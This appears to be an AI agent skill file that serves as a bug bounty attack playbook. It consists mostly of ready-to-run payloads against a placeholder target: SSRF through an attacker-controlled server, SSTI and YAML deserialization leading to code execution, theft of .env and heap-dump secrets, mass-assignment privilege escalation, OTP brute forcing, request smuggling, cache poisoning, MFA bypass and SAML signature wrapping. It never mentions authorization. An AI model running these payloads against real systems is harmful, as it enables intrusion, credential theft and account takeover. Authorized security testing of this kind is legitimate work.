---
name: advanced-techniques
description: Framework-specific attack playbooks, mobile app testing, CI/CD pipeline attacks, HTTP request smuggling, cache poisoning, and MFA/2FA bypass patterns. With differential testing integrated. Use when targeting specific frameworks or need platform-specific attack vectors.
---

# ADVANCED BUG BOUNTY TECHNIQUES — DIFFERIAL TESTING INTEGRATED

Framework-specific attacks, mobile testing, CI/CD pipelines, and deep-dive technique references.

---

## 1. FRAMEWORK-SPECIFIC ATTACK PLAYBOOKS

### Next.js

```bash
# Server Actions CSRF — Origin: null bypass
curl -X POST https://target.com/action -H "Origin: null" -H "Content-Type: application/json" \
  -d '{"action":"deleteAccount"}'

# Image optimizer SSRF via redirect
curl "https://target.com/_next/image?url=https://your-server.com/redirect-to-metadata&w=128&q=75"

# Middleware bypass via _next/data
curl "https://target.com/_next/data/BUILD_ID/admin/dashboard.json"

# Exposed __NEXT_DATA__ with sensitive props
curl -s https://target.com/dashboard | grep -o '__NEXT_DATA__.*</script>' | \
  python3 -c "import sys,json; d=json.loads(sys.stdin.read().replace('__NEXT_DATA__ = ','').replace('</script>','')); print(json.dumps(d['props'], indent=2))"

# rewrites proxy creating SSRF
curl "https://target.com/api/../../admin/internal-endpoint"
```

**Priority checks**: `__NEXT_DATA__` on every authenticated page, `/_next/image` SSRF, middleware bypass on admin routes.

### Laravel

```bash
# Debug mode → RCE via Ignition (CVE-2021-3129)
curl -s https://target.com/_ignition/health-check

# Exposed dashboards
curl -sI https://target.com/horizon    # Queue dashboard
curl -sI https://target.com/telescope  # Request inspector
curl -sI https://target.com/nova       # Admin panel

# APP_KEY leak → session/cookie forging
curl -s https://target.com/.env | grep APP_KEY

# Mass assignment in Eloquent models
curl -X PUT https://target.com/api/profile -H "Content-Type: application/json" \
  -d '{"name":"hacker","is_admin":true,"role":"admin","credits":999999}'

# Laravel debug error page leaks
curl "https://target.com/api/users/not-a-number"
```

### Spring Boot

```bash
# Actuator endpoints — gold mine if exposed
curl -s https://target.com/actuator/ | python3 -m json.tool
curl -s https://target.com/actuator/env          # Environment variables (secrets!)
curl -s https://target.com/actuator/heapdump -o heap.bin  # Memory dump → grep for passwords
curl -s https://target.com/actuator/mappings      # All URL mappings (hidden endpoints!)
curl -s https://target.com/actuator/jolokia/list  # JMX beans → possible RCE

# Alternative paths (if /actuator is blocked)
curl -s https://target.com/manage/env
curl -s https://target.com/actuator/..;/env  # Tomcat path normalization bypass

# SpEL injection in error messages
curl "https://target.com/api/search?q=\${7*7}"
# If response contains "49" → SpEL injection → RCE

# Thymeleaf SSTI
curl "https://target.com/path?lang=__\${T(java.lang.Runtime).getRuntime().exec('id')}__::.x"
```

### Django

```bash
# Debug toolbar exposed
curl -s https://target.com/__debug__/

# SECRET_KEY in .env → session forging
curl -s https://target.com/.env | grep SECRET_KEY

# ORM injection via __ lookups
curl "https://target.com/api/users?filter=password__startswith=a"
curl "https://target.com/api/users?filter=email__regex=.*"
curl "https://target.com/api/users?order_by=password"  # Boolean oracle via ordering

# Admin panel check
curl -sI https://target.com/admin/
```

### WordPress

```bash
# xmlrpc.php brute force + pingback SSRF
curl -s -X POST https://target.com/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'

# REST API user enumeration
curl -s https://target.com/wp-json/wp/v2/users | python3 -m json.tool
curl -s "https://target.com/?author=1"  # Redirects to /author/USERNAME/

# Subscriber → Admin escalation via plugin bugs
curl -X POST https://target.com/wp-admin/admin-ajax.php \
  -H "Cookie: wordpress_logged_in_xxx=SUBSCRIBER_COOKIE" \
  -d "action=PLUGIN_ACTION&role=administrator"
```

### Ruby on Rails

```bash
# YAML deserialization RCE (older Rails + psych gem)
curl -X POST https://target.com/api/endpoint \
  -H "Content-Type: application/x-yaml" \
  -d '--- !ruby/object:Gem::Installer i: x'

# Mass assignment
curl -X PATCH https://target.com/api/users/me \
  -H "Content-Type: application/json" \
  -d '{"user":{"admin":true,"role":"superadmin","verified":true}}'

# Secret key leak → session cookie forging
curl -s https://target.com/.env | grep SECRET_KEY_BASE
```

### GraphQL Deep Dive

```graphql
# Introspection (even when "disabled" — try POST + GET + different content types)
{__schema{types{name,fields{name,type{name,kind,ofType{name,kind}}}}}}

# Alias-based IDOR (fetch multiple users in one request)
{a1: user(id: "1") { email ssn } a2: user(id: "2") { email ssn } a3: user(id: "3") { email ssn }}

# Batched queries for rate limit bypass
[
  {"query":"mutation{login(email:\"victim@test.com\",otp:\"0001\"){token}}"},
  {"query":"mutation{login(email:\"victim@test.com\",otp:\"0002\"){token}}"}
]

# Nested query DoS
{users {posts {comments {author {posts {comments {author {id}}}}}}}}

# Mutation authorization bypass
mutation { updateUserRole(userId: "victim", role: ADMIN) { id role } }
```

---

## 2. MOBILE APP TESTING

### Android

```bash
# Decompile APK
apktool d target.apk -o target_src
jadx target.apk -d target_jadx

# Find hardcoded secrets
grep -rn "api_key\|secret\|password\|token\|Bearer" target_jadx/

# Check AndroidManifest.xml for exported components
grep -i 'exported="true"' target_src/AndroidManifest.xml

# Find deep link handlers
grep -A5 '<data android:scheme' target_src/AndroidManifest.xml

# Certificate pinning bypass
objection -g com.target.app explore
# Then: android sslpinning disable
```

### iOS

```bash
# Extract IPA from jailbroken device
frida-ios-dump -u com.target.app

# Binary analysis
strings target.app/target | grep -i "api\|key\|secret\|http\|password\|token"

# Class dump
class-dump -H target.app/target -o headers/
grep -rn "admin\|debug\|hidden\|internal\|test" headers/

# Runtime manipulation with Frida
frida -U -f com.target.app -l bypass_ssl.js
```

### Common Mobile Bugs

| Bug | Where | Impact |
|-----|-------|--------|
| Hardcoded API keys | Decompiled source | Depends on scope |
| Certificate pinning bypass | Frida/objection | MitM on all traffic |
| Exported components | AndroidManifest.xml | Launch internal activities |
| Deep link injection | URL scheme handlers | Trigger actions without auth |
| Local data storage | SharedPreferences, SQLite | Credential theft |
| WebView XSS | loadUrl with user data | Cookie theft |
| Intent redirection | startActivity with untrusted Intent | Internal component access |
| Backup extraction | android:allowBackup="true" | Extract app data |

---

## 3. CI/CD PIPELINE ATTACKS

### GitHub Actions

```yaml
# DANGEROUS: pull_request_target + checkout of PR code
on: pull_request_target
steps:
  - uses: actions/checkout@v4
    with:
      ref: ${{ github.event.pull_request.head.sha }}  # VULN
  - run: make build  # Attacker-controlled Makefile runs with repo secrets
```

```bash
# What to look for:
grep -rn "pull_request_target" .github/workflows/
grep -rn 'github.event.pull_request.head' .github/workflows/
grep -rn "permissions:" .github/workflows/ -A5 | grep "write"
grep -rn "secrets\." .github/workflows/ | grep -v "github.token"
```

### GitLab CI

```yaml
# DANGEROUS: rules:changes on fork MRs + before_script
variables:
  DEPLOY_KEY: $DEPLOY_KEY
before_script:
  - echo $DEPLOY_KEY | base64 -d > ~/.ssh/id_rsa
```

---

## 4. HTTP REQUEST SMUGGLING

### CL.TE

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL

```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 3

8

SMUGGLED

0
```

### TE.TE (Obfuscation)

```http
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
```

---

## 5. CACHE POISONING

```http
# Unkeyed headers
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
# If reflected → cache serves response with evil.com to all users

# Fat GET
GET /?param=normal HTTP/1.1
Host: target.com
X-HTTP-Method-Override: POST
Content-Length: 0
# If cache keys on GET param but backend sees POST → poison
```

---

## 6. MFA/2FA BYPASS

| # | Pattern | Test |
|---|---------|------|
| 1 | Response manipulation | Change `{"verified": false}` → `{"verified": true}` |
| 2 | SMS delay exploit | Request OTP, wait for expiry, try old code on different endpoint |
| 3 | Backup code brute | 4-6 digit backup codes, often no rate limit |
| 4 | Cookie/session manipulation | Set `mfa_completed=true` cookie after first factor |
| 5 | Step skip | Navigate directly to /dashboard after first factor |
| 6 | Race on OTP | Send 10 concurrent OTP verification requests before lockout |
| 7 | SMS callback | If SMS gateway has webhook, intercept OTP in transit |

---

## 7. SAML ATTACKS

### XSW (XML Signature Wrapping)

```xml
<saml:Assertion>
  <xx:Execute xmlns:xx="http://example.com">
    <saml:Assertion>
      <saml:Subject><saml:NameID>admin@example.com</saml:NameID></saml:Subject>
    </saml:Assertion>
  </xx:Execute>
</saml:Assertion>
<!-- Signature validates on outer, app processes inner -->
```

### Comment Injection

```xml
<saml:NameID>admin@example.com<!-- -->@attacker.com</saml:NameID>
```

### Signature Stripping

```bash
# Remove <ds:Signature>...</ds:Signature> block
# If app doesn't re-validate → assertion accepted without signature
```
